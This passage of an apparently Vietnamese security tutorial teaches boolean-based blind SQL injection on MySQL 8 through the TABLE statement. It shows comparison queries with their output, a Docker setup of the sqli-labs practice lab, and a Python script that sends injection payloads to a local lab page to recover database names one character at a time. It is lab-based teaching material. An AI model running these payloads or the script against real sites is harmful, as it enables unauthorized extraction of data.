class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">table</span> information_schema.schemata limit <span class="number">2</span>,<span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> CATALOG_NAME <span class="operator">|</span> SCHEMA_NAME        <span class="operator">|</span> DEFAULT_CHARACTER_SET_NAME <span class="operator">|</span> DEFAULT_COLLATION_NAME <span class="operator">|</span> SQL_PATH <span class="operator">|</span> DEFAULT_ENCRYPTION <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> performance_schema <span class="operator">|</span> utf8mb4                    <span class="operator">|</span> utf8mb4_0900_ai_ci     <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NO</span>                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+--------------------+----------------------------+------------------------+----------+--------------------+</span></span><br></pre></td></tr></table></figure><p>Để dump ra tên SCHEMA_NAME bằng hàm table ta sẽ sử dụng Boolean-based SQL Injection. Để dễ hình dung chúng ta cùng đi vào ví dụ:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--Mình chỉ viết ra đầy đủ 1 câu truy vấn nếu như dính sqli sẽ như thế nào để các bạn dễ hình dung. Mình sẽ giải thích sau ^^</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)<span class="operator">&lt;=</span>(<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name  <span class="operator">|</span> emotion <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> rayin <span class="operator">|</span> love    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)<span class="operator">&lt;=</span>(<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>Lưu ý là nếu chúng ta cần tìm cột sau thì phải biết giá trị cột trước mới so sánh được, các cột sau không quan trọng. Ở đây giá trị của cột đầu tiên sẽ là def, cột thứ 2 là tên database, các cột sau là không quan trọng đối với chúng ta. Chúng ta cùng đi vào phần boolean của payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                  <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                  <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                  <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>Câu lệnh này ở đây phần sẽ tương đương với việc so sánh chuỗi thứ 2 thuộc (‘def’,’m’,3,4,5,6) với chuỗi thứ 2 từ information_schema.schemata. Và với chỉ 1 kí tự nó sẽ so sánh kí tự đó với kí tự đầu của chuỗi, ở đây là <code>l và mysql sẽ tương đương với so sánh l với m</code>. Và vì l&lt;&#x3D;m nên trả về true, m&lt;&#x3D;m nên cũng trả về true, và với n&gt;m nên trả về false. Vậy với việc select với boolean mà ra giá trị có nghĩa là kí tự đó vẫn đang &lt;&#x3D; kí tự cần tìm. Rồi đến khi clause là false tương đương với kí tự đó lớn hơn kí tự cần tìm, thì ta sẽ xác định kí tự trước đó là kí tự chúng ta cần tìm.</p><p>Tương tự như thế và ta sẽ có được tên database đầu tiên.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;ms&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;ms&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;my&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;my&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mz&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mz&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                   <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure><p>Tiếp tục chúng ta sẽ thay đổi limit clause để lấy từng database ra.</p><h2 id="Test-truc-tiep-bang-sql-labs"><a href="#Test-truc-tiep-bang-sql-labs" class="headerlink" title="Test trực tiếp bằng sql-labs"></a>Test trực tiếp bằng sql-labs</h2><h3 id="Xay-dung-moi-truong"><a href="#Xay-dung-moi-truong" class="headerlink" title="Xây dựng môi trường:"></a>Xây dựng môi trường:</h3><p>Đầu tiên các bạn cần cài đặt docker, khá là dễ thôi nên các bạn tự mình cài lấy nhé.</p><p>Cài đặt sqli-labs:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/c0ny1/vulstudy.git</span><br><span class="line"><span class="built_in">cd</span> vulstudy/sqli-labs</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>Tiếp theo cài đặt Mysql 8:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql:lastest</span><br><span class="line">docker run --name mysql -p (Địa chỉ ip của bạn, không có dấu ngoặc nhé):3306:3306 -e MYSQL_ROOT_PASSWORD=root -d mysql:tag</span><br></pre></td></tr></table></figure><p>Trong terminal gõ <code>docker ps</code> để lấy id của container.<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/mysql8/dockerContainer.png"><br>Tiếp theo thay đổi cấu hình của sqli-labs:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwn@DESKTOP-AC6UABE:pts/3-&gt;/home/pwn (0)</span><br><span class="line">&gt; docker <span class="built_in">exec</span> -it e70d0c13145d /bin/bash</span><br><span class="line">--------------------</span><br><span class="line">root@e70d0c13145d:/<span class="comment"># ls</span></span><br><span class="line">app   create_mysql_admin_user.sh  home   media  proc  run.sh  start-apache2.sh  tmp</span><br><span class="line">bin   dev                         lib    mnt    root  sbin    start-mysqld.sh   usr</span><br><span class="line">boot  etc                         lib64  opt    run   srv     sys               var</span><br><span class="line">--------------------</span><br><span class="line"><span class="built_in">cd</span> app</span><br><span class="line"><span class="built_in">cd</span> sql-connections</span><br></pre></td></tr></table></figure><p>Tiếp theo sử dụng vim để thay đổi nội dung của file db-creds.inc. Hơi khó sử dụng, các bạn tự đọc nhé ^^.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vi db-creds.inc</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//give your mysql connection username n password</span><br><span class="line"><span class="variable">$dbuser</span> =<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> =<span class="string">&#x27;root&#x27;</span>;//đổi theo mật khẩu đặt <span class="built_in">tr</span>ên câu lệnh mysql <span class="built_in">tr</span>ên.</span><br><span class="line"><span class="variable">$dbname</span> =<span class="string">&quot;security&quot;</span>;</span><br><span class="line"><span class="variable">$host</span> = <span class="string">&#x27;172.30.144.1&#x27;</span>;//đổi lại thành ip nhập ở câu lệnh mysql <span class="built_in">tr</span>ên kia nhé</span><br><span class="line"><span class="variable">$dbname1</span> = <span class="string">&quot;challenges&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Cấu hình mysql:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwn@DESKTOP-AC6UABE:pts/3-&gt;/home/pwn (0)</span><br><span class="line">&gt; docker <span class="built_in">exec</span> -it e99f25e4be29 /bin/bash</span><br><span class="line">root@e99f25e4be29:/<span class="comment"># mysql -u root -p</span></span><br><span class="line">Enter password: </span><br><span class="line">// Đoạn này nhập mk vào nhé, ở đây mình đặt root nên nhập root. Nếu các bạn làm theo mình thì cũng là root. </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection <span class="built_in">id</span> is 8</span><br><span class="line">Server version: 8.0.29 MySQL Community Server - GPL</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2022, Oracle and/or its affiliates.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br><span class="line">Cuối cùng gõ:</span><br><span class="line">mysql&gt; ALTER USER <span class="string">&#x27;root&#x27;</span> IDENTIFIED WITH mysql_native_password BY <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure><p>Thế là đã xong. Bây giờ gõ localhost trên trình duyệt là sẽ thấy trang web.<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/mysql8/localhost.png"></p><h3 id="Dump-database"><a href="#Dump-database" class="headerlink" title="Dump database:"></a>Dump database:</h3><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/mysql8/database_test.png"></p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/mysql8/database_test_false.png"></p><p>Vế phía sau and trả về true thì trên màn hình sẽ có <code>Your Login name</code> và <code>Your Password</code>, còn trả về false thì sẽ không xuất hiện gì cả. Từ đây chúng ta có thể sử dụng boolean sqli kết hợp câu lệnh table để dump ra database.</p><p>Chúng ta cần lưu ý về kí tự cuối cùng, <code>(&#39;def&#39;,&#39;mysql&#39;,3,4,5,6)</code> sẽ không bằng với (table information_schema.schemata limit 0,1) nên kí tự cuối sẽ dừng ở chữ k, chuổi bây giờ sẽ là mysqk và với các kí tự nhiễu sau nó sẽ là không bằng và sẽ tiếp tục chạy. Ví dụ ở script dưới sẽ dừng khi i chạy hết 1 đến 20. Khi đó chúng ta có thể cho chạy vậy hoặc lọc cái đó ra vì nó không ảnh hưởng đến kết quả(các bạn test thì sẽ thấy ^^).</p><p>Ví dụ:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--Kí tự bình thường.</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mysp&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mysp&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mysq&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mysq&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">--Kí tự cuối:</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mysqk&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mysqk&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                      <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mysql&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mysql&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                      <span class="number">0</span> <span class="operator">|</span> <span class="comment">-- Trả về false</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Script dump database:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">&#x27;http://localhost/Less-1/?id=&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nhập index kí tự cần tìm (VD: 1,2,3,...): &quot;</span>)</span><br><span class="line">index_db = <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="built_in">input</span>())-<span class="number">1</span>)</span><br><span class="line">db_name = <span class="string">&quot;&quot;</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> count &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;`abcdefghijklmnopqrstuvwxyz-&#123;|&#125;~&quot;</span>:</span><br><span class="line">        payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&#123;&#125;&#x27;,3,4,5,6)&lt;=(table information_schema.schemata limit &#123;&#125;,1)-- -&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            db_name+j, index_db)</span><br><span class="line">        <span class="built_in">print</span>(db_name+j)</span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        payload_encoded = urllib.parse.quote(payload)</span><br><span class="line">        r = requests.get(url=url+payload_encoded)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            <span class="comment"># bước này mình check khi nó bị nhiễu ở kí tự cuối</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            db_name += <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># Thay đổi kí tự cuối về đúng kí tự cần tìm ví dụ nó xuất ra mysqk thì chúng ta cần đổi về mysql bằng cách tăng ascii thằng k lên 1</span></span><br><span class="line">list_dbname = <span class="built_in">list</span>(db_name)</span><br><span class="line">list_dbname[-<span class="number">1</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(list_dbname[-<span class="number">1</span>])+<span class="number">1</span>)</span><br><span class="line">db_name = <span class="string">&quot;&quot;</span>.join(list_dbname)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Database name is: &quot;</span>+db_name)</span><br></pre></td></tr></table></figure><h3 id="Dump-table"><a href="#Dump-table" class="headerlink" title="Dump table:"></a>Dump table:</h3><p>Tìm số cột của bảng 